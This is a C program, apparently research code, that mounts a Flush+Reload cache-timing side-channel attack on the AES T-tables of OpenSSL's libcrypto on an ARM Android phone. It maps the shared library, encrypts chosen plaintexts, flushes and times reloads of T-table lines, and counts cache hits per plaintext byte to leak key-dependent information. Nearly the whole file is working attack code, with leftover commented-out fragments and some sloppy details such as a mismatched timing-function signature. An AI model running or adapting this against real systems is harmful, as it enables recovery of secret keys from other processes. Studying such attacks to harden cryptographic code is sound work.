
#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <inttypes.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <libflush/libflush.h>

//#include <asm/cacheflush.h>
//#include "cacheutils.h"
//#include <map>
//#include <vector>
//#include <iostream>
// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (110)
#define THRESHOLD (270)
#define CPU 2


// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (350)
#define NUMBER_OF_ENCRYPTIONS2 (12000)
#define MAP_SIZE 4096

static inline uint32_t get_cycle_count(void);
static inline void dcache_clean(void);
static inline void flush(void *addr);
void setCurrentThreadAffinityMask(cpu_set_t mask);

void setCurrentThreadAffinityMask(cpu_set_t mask)
{
    int err, syscallres;
    pid_t pid = getpid();
    printf("The process id is %zu\n",getpid()); 
    syscallres = syscall(__NR_sched_setaffinity, pid, sizeof(mask), &mask);
    if (syscallres)
    {
        err = errno;
        printf("Error no is %d",err);
       // LOGE("Error in the syscall setaffinity: mask=%d=0x%x err=%d=0x%x", mask, mask, err, err);
    }
}


unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

size_t sum;
size_t scount;

//std::map<char*, std::map<size_t, size_t> > timings;
//std::map<size_t,size_t > timings_delta;
char* base;
char* probe;
char* end;
unsigned char* tmp;
unsigned char* tmp_end;

int main()
{
   
  //unsigned char array[4096]={0};
 // int *address = &array[4096]; 
  int fd = open("/data/local/tmp/crypto/libcrypto.so.1.0.0", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if ((map_size) & (0xFFF != 0))
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0);
  end = base + size;
  getchar();
  //tmp = base + 0x14f45c;
 // tmp_end = tmp + 0x1000;
  //volatile unsigned int *p = (volatile unsigned int *)tmp;
  printf("The begining value of tables are is %p\n",base);
  int i =0;
 /*
  for(i=0;i<4;i++) 
     printf("%02x\n",*(tmp+3-i));
 */
 /*
  printf("Printing from next table\n");   
  for(i=0;i<4;i++) 
    printf("%02x\n",*(tmp_end+3-i));
   */
 
     
  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
 // unsigned char plaintext[]="Aditya";
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];
  
  
  libflush_session_t* libflush_session;
  
 

  AES_KEY key_struct;
  AES_set_encrypt_key(key, 128, &key_struct);
  struct timespec time = {0,0};
  struct timespec time_seed = {0,0};
  struct timespec time2 ={0,0};
  struct timespec time3 ={0,0};
  struct timespec time4 ={0,0};
  clock_gettime(CLOCK_MONOTONIC, &time_seed);
  double measured_time = ((double)time.tv_sec + 1.0e-9*time.tv_nsec);
  srand(measured_time);
  libflush_init(&libflush_session, NULL);
  size_t sets = libflush_get_number_of_sets(libflush_session);
  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
  printf("Number of active cpus %zu\n",number_of_cpus);
  cpu_set_t mask;
  pid_t current_process = getpid();
   /* CPU_ZERO initializes all the bits in the mask to zero. */
  CPU_ZERO(&mask);
   /* CPU_SET sets only the bit corresponding to cpu. */
  int cpu =0;
  CPU_SET(cpu, &mask );
   /* sched_setaffinity returns 0 in success */
  if( sched_setaffinity( 0, sizeof(mask), &mask ) == -1 )
   {
      printf("WARNING: Could not set CPU Affinity, continuing...\n");}
      else{
		  printf("<1>The affinity has been set..\n");
	  }
  //getchar();
  printf("The number of sets in Nexus 5 are %zu\n", sets);
  int flag =0;
  for (size_t byte = 0; byte < 256; byte += 16)
    {
     plaintext[0]=byte;
     
     size_t set_index;
     AES_encrypt(plaintext, ciphertext, &key_struct);
/* Probing the T-table elements*/
  for (probe =(base + 0x14f45c); probe < (base + 0x15045c); probe += 64) // 16    
      {	
	  set_index=libflush_get_set_index(libflush_session,probe);		
	  printf("\nThe value of probe's set index is %zu\n",set_index);
	  volatile unsigned int *p = (volatile unsigned int *)probe;
	  for(i=0;i<4;i++) 
			printf("%02x\n",*(probe+3-i));
       //getchar();
       size_t count = 0;
       size_t delta_sum = 0;
       size_t delta =0;
       usleep(1);
       for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
        {  
        for (size_t j = 1; j < 16; ++j)
			plaintext[j] = rand() % 256;
		
        AES_encrypt(plaintext,ciphertext,&key_struct);
		clock_gettime(CLOCK_MONOTONIC, &time);
        libflush_access_memory(probe);
        clock_gettime(CLOCK_MONOTONIC, &time2);
        //libflush_evict(libflush_session,probe);
        flush(probe);
        //getchar();
       // dcache_clean();
        //AES_encrypt(plaintext,ciphertext,&key_struct);
       // usleep(1);
        //sched_yield();
        clock_gettime(CLOCK_MONOTONIC, &time3);
        libflush_access_memory(probe);
        clock_gettime(CLOCK_MONOTONIC, &time4);
       // size_t probe_timer_start = libflush_reload_address(libflush_session, tmp);
        size_t delta_aes2 = time4.tv_nsec-time3.tv_nsec ; 
        //delta = (timer3-timer2)-delta_aes2;
        if (delta_aes2 > THRESHOLD)
          ++count;
	   fprintf(stdout, "\n Timings for accessing probe at %p  for first time is %ld \n",probe,(time2.tv_nsec-time.tv_nsec));
	    fprintf(stdout, "\n Timings for accessing evicted address\t at %p is %ld \n",probe,(time4.tv_nsec-time3.tv_nsec));
	//    printf("Time to access data first time at %p:%zu\n",tmp, probe_timer_start1);
	//	printf("Time to access evicted data at %p:%"PRIu32"\n",tmp,probe_timer_start);
		//fprintf(stdout, "Time-difference between 2nd & 3rd AES\t %zu\n",delta);
		}
		fprintf(stdout, "\n Address:%p \t Byte:%zu \t Count:%zu\n",probe,byte,count);
		
      // fprintf(stdout,"%zu\t%zu\n",byte,delta_);
     // timings_delta[byte]=delta_sum;
    //  timings[probe][byte] = count;
    }
    printf("Flag : %d\n\n\n\n\n\n\n\n",flag);
  //  getchar();
        flag++;
    
  }
  
/*printf("\n\n\n\n**********\n\n\n\n");
printf("\nPrinting the values of timings w.r.t the probe address and plain-text bytes\n");*/
/*
  for (auto ait : timings)
  {
    printf("%p:\t", (void*) (ait.first - base));
    for (auto kit : ait.second)
    {adv
      printf("%6lu,", kit.second);
    }
    printf("\n");
  }

*/
   /* Terminate libflush */
  libflush_terminate(libflush_session);
  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  getchar();
  return 0;
}

static inline size_t get_cycle_count(void)
{
        uint32_t r = 0;
         __asm__ volatile("mrc p15, 0, %0, c9, c13, 0" : "=r"(r) );
        return r;
}
 static inline void flush(void *addr)
 {
     __asm__ __volatile__("mcr p15, 0, %0, c7, c6, 1"::"r"(addr));                                              
 } 
static inline void dcache_clean(void)
 {
     const int zero = 0;
     /* clean entire D cache -> push to external memory. */
     __asm volatile ("1: mrc p15, 0, r15, c7, c10, 3\n"
                     " bne 1b\n" ::: "cc");
     /* drain the write buffer */
   // __asm volatile ("mcr 15, 0, %0, c7, c10, 4"::"r" (zero));
 }

